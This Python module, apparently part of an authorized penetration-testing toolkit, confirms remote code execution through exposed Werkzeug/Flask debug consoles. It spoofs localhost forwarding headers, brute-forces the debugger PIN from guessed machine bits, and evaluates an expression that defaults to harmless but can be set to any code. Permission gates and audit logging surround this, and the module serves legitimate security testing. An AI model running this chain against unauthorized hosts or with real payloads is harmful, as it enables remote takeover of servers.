"""Opt-in intrusive validation (non-destructive proofs only).

This module is deliberately hard to invoke by accident:

* the caller must pass ``confirm=True`` (CLI: ``--confirm-authorized``),
* the target must be in scope, and
* ``scope.yaml → rules.allow_intrusive`` must be ``true``.

Validation is limited to *proving* a vulnerability with a harmless Python
expression (default ``40+2``). No OS commands, no writes, no data access.
Every attempt is logged to ``logs/audit.log``.
"""

from __future__ import annotations

import hashlib
import json
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

from . import findings as findings_mod
from . import scope

_SSL = ssl.create_default_context()
_SSL.check_hostname = False
_SSL.verify_mode = ssl.CERT_NONE

_TRUSTED_HEADERS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-Host": "localhost",
    "X-Forwarded-Proto": "http",
    "X-Real-IP": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "Forwarded": "for=127.0.0.1;host=localhost;proto=http",
}

_SECRET_RE = re.compile(r"SECRET\s*=\s*[\"']([^\"']+)[\"']")
_TRUSTED_RE = re.compile(r"EVALEX_TRUSTED\s*=\s*(true|false)", re.I)


class IntrusiveNotAuthorized(Exception):
    """Raised when intrusive validation was not explicitly authorized."""


def authorize(target: str, confirm: bool):
    if not confirm:
        raise IntrusiveNotAuthorized(
            "Intrusive validation requires explicit --confirm-authorized."
        )
    sc = scope.get_scope()
    ok, reason = sc.check(target)
    if not ok:
        raise IntrusiveNotAuthorized(f"Target not authorized: {reason}")
    if not sc.rules.get("allow_intrusive", False):
        raise IntrusiveNotAuthorized(
            "scope.yaml rules.allow_intrusive is false; enabling intrusive "
            "testing is required for this operation."
        )
    return sc


# ---------------------------------------------------------------------------
# HTTP
# ---------------------------------------------------------------------------

def _http(url: str, headers: dict | None = None, timeout: int = 20,
          limit: int = 300000) -> tuple[int, dict, str]:
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "KaliPentestMCP/1.0 (authorized intrusive validation)",
            **(headers or {}),
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_SSL) as resp:
            body = resp.read(limit).decode("utf-8", "replace")
            return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as exc:
        body = exc.read(limit).decode("utf-8", "replace")
        return exc.code, dict(exc.headers), body


def _audit(line: str) -> None:
    log = Path(__file__).resolve().parent.parent / "logs" / "audit.log"
    log.parent.mkdir(parents=True, exist_ok=True)
    with log.open("a", encoding="utf-8") as fh:
        fh.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S%z')}\tintrusive\t{line}\n")


# ---------------------------------------------------------------------------
# Werkzeug debug console
# ---------------------------------------------------------------------------

def _derive_pin(public_bits: list[str], private_bits: list[str]) -> str:
    """Reproduce Werkzeug's PIN derivation for candidate bits."""
    h = hashlib.sha1()
    for bit in list(public_bits) + list(private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8", "replace")
        h.update(bit)
    h.update(b"cookiesalt")
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    return f"{num[0:3]}-{num[3:6]}-{num[6:9]}"


def _pin_hash(pin: str, secret: str) -> str:
    return hashlib.sha1(f"{pin} {secret}".encode()).hexdigest()


def _eval(console_url: str, expression: str, *, pin_hash: str | None = None,
          headers: dict | None = None, timeout: int = 20):
    params = {"__debugger__": "yes", "cmd": expression, "frm": "0"}
    if pin_hash:
        params["s"] = pin_hash
    url = console_url + "?" + urllib.parse.urlencode(params)
    return _http(url, headers=headers, timeout=timeout)


def _eval_succeeded(status: int, body: str, expect: str) -> bool:
    if status != 200 or "not authorized" in body.lower():
        return False
    try:
        data = json.loads(body)
    except ValueError:
        return False
    if not isinstance(data, dict) or "data" not in data:
        return False
    result = json.dumps(data.get("data"))
    return expect in result


def validate_werkzeug_console(
    console_url: str,
    *,
    confirm: bool = False,
    execute: str = "40+2",
    timeout: int = 20,
    max_pin_attempts: int = 48,
    delay: float = 0.25,
) -> dict:
    """Non-destructively validate an exposed Werkzeug/Flask debug console."""
    authorize(console_url, confirm)
    _audit(f"validate_werkzeug_console url={console_url} cmd={execute!r}")

    result: dict = {
        "endpoint": console_url,
        "present": False,
        "secret": None,
        "server": None,
        "evalextrusted_initial": False,
        "trusted_via_headers": False,
        "attempts": [],
        "rce_confirmed": False,
        "pin": None,
        "evidence": "",
    }

    status, headers, page = _http(console_url, timeout=timeout)
    result["status"] = status
    result["server"] = headers.get("Content-Type", "") or headers.get("Server", "")
    result["present"] = "werkzeug debugger" in page.lower()
    m = _SECRET_RE.search(page)
    if m:
        result["secret"] = m.group(1)
    tm = _TRUSTED_RE.search(page)
    if tm:
        result["evalextrusted_initial"] = tm.group(1).lower() == "true"

    # 1) try to be treated as a trusted (localhost) client
    hstatus, _hheaders, hpage = _http(
        console_url, headers=_TRUSTED_HEADERS, timeout=timeout
    )
    htm = _TRUSTED_RE.search(hpage)
    trusted = bool(htm and htm.group(1).lower() == "true")
    result["trusted_via_headers"] = trusted

    headers_to_use = _TRUSTED_HEADERS if trusted else None

    # 2) attempt a harmless evaluation
    if trusted:
        s, _h, body = _eval(console_url, execute, headers=headers_to_use,
                            timeout=timeout)
        ok = _eval_succeeded(s, body, "42")
        result["attempts"].append({
            "mode": "trusted-header", "status": s, "snippet": body[:400],
            "success": ok,
        })
        if ok:
            result["rce_confirmed"] = True
            result["evidence"] = body[:1500]
            return result

    # 3) best-effort PIN derivation (public bits are guessable, private are not)
    secret = result["secret"]
    if secret:
        usernames = ["www-data", "root", "kali", "ubuntu", "app", "vulnbank",
                     "flask", "nobody"]
        modnames = ["flask.app"]
        appnames = ["Flask", "app"]
        modfiles = [
            "/usr/local/lib/python3.11/site-packages/flask/app.py",
            "/usr/local/lib/python3.12/site-packages/flask/app.py",
            "/usr/lib/python3/dist-packages/flask/app.py",
            "/app/app.py", "/app/application.py", "/app/run.py",
        ]
        private = ["", "0", "1"]

        attempts = 0
        for user in usernames:
            for modfile in modfiles:
                for priv in private:
                    if attempts >= max_pin_attempts:
                        break
                    attempts += 1
                    pin = _derive_pin(
                        [user, modnames[0], appnames[0], modfile],
                        [priv, priv],
                    )
                    time.sleep(delay)
                    s, _h, body = _eval(
                        console_url, execute, pin_hash=_pin_hash(pin, secret),
                        timeout=timeout,
                    )
                    if _eval_succeeded(s, body, "42"):
                        result["rce_confirmed"] = True
                        result["pin"] = pin
                        result["evidence"] = body[:1500]
                        result["attempts"].append({
                            "mode": "pin-derived", "pin": pin, "status": s,
                            "snippet": body[:400], "success": True,
                        })
                        return result
                if attempts >= max_pin_attempts:
                    break
            if attempts >= max_pin_attempts:
                break
        result["pin_attempts"] = attempts

    # 4) record the plain (unauthenticated) response for the report
    s, _h, body = _eval(console_url, execute, timeout=timeout)
    result["attempts"].append({
        "mode": "unauthenticated", "status": s, "snippet": body[:400],
        "success": False,
    })
    result["evidence"] = body[:1500]
    return result


def to_finding(target: str, url: str, result: dict):
    """Convert a validation result into a report Finding."""
    confirmed = result.get("rce_confirmed")
    title = (
        "Confirmed RCE via exposed Werkzeug debug console"
        if confirmed
        else "Exposed Werkzeug/Flask debug console (PIN-locked; RCE conditional)"
    )
    sev = "critical" if confirmed else "high"
    desc = (
        "The Werkzeug/Flask interactive debugger is publicly reachable. "
        + ("A harmless expression (40+2) was evaluated remotely, proving "
           "arbitrary code execution in the application context."
           if confirmed else
           "The console is reachable but PIN-locked; with the leaked debugger "
           "SECRET and machine-specific bits the PIN may be derivable, making "
           "RCE conditionally exploitable.")
    )
    return findings_mod.Finding(
        id=findings_mod._fid(title, url, target),
        title=title,
        severity=sev,
        target=target,
        tool="intrusive/werkzeug",
        endpoint=url,
        confidence="high" if confirmed else "medium",
        description=desc,
        evidence=result.get("evidence", "")[:2000],
        remediation=(
            "Disable debug mode in production (FLASK_DEBUG=false), remove the "
            "debug console from public reach, and rotate the leaked secrets."
        ),
        references=[
            "https://werkzeug.palletsprojects.com/en/stable/debug/",
            "https://owasp.org/www-community/vulnerabilities/Information_exposure",
        ],
    )
